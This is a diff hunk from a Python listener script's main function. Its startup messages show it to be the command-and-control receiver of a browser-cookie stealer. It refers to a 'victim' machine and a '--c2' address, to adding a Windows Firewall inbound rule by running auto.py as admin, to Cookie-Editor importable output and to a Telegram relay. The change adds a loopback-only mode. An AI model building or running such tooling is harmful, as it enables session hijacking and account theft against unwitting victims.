@@ -476,15 +476,18 @@ def main():
     print("[listen] health: %s://localhost:%d/health" % (scheme, PORT))
     if TLS_CONTEXT:
         print("[listen] TLS: cert=%s key=%s (min TLS 1.2)" % (TLS_CERT, TLS_KEY))
-    try:
-        from c2auth import local_lan_ip
-        lan = local_lan_ip()
-        if not lan.startswith("127."):
-            print("[listen] LAN:    %s://%s:%d/   <- put this in --c2" % (scheme, lan, PORT))
-            print("[listen] if the victim is on another machine, Windows Firewall must")
-            print("[listen] allow inbound TCP %d (auto.py adds the rule when run as admin)." % PORT)
-    except Exception:
-        pass
+    if BIND in ("127.0.0.1", "localhost"):
+        print("[listen] loopback-only: use a local tunnel or test client; no inbound firewall rule needed")
+    else:
+        try:
+            from c2auth import local_lan_ip
+            lan = local_lan_ip()
+            if not lan.startswith("127."):
+                print("[listen] LAN:    %s://%s:%d/   <- put this in --c2" % (scheme, lan, PORT))
+                print("[listen] if the victim is on another machine, Windows Firewall must")
+                print("[listen] allow inbound TCP %d (auto.py adds the rule when run as admin)." % PORT)
+        except Exception:
+            pass
     print("[listen] format: Cookie-Editor JSON (browser-importable)")
     global TELEGRAM
     TELEGRAM = telegram_preflight(TELEGRAM)
